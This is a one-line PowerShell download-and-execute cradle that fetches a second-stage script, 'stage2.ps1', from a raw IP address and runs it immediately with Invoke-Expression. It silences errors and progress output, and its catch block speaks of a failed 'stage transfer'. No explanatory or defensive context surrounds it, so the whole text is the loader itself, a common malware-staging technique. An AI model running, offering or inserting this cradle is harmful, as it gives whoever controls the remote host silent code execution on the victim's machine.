
try { $Stage1Url = "http://203.0.113.171/stage2.ps1"; IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing -ErrorAction SilentlyContinue).Content; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Stage transfer failed" }
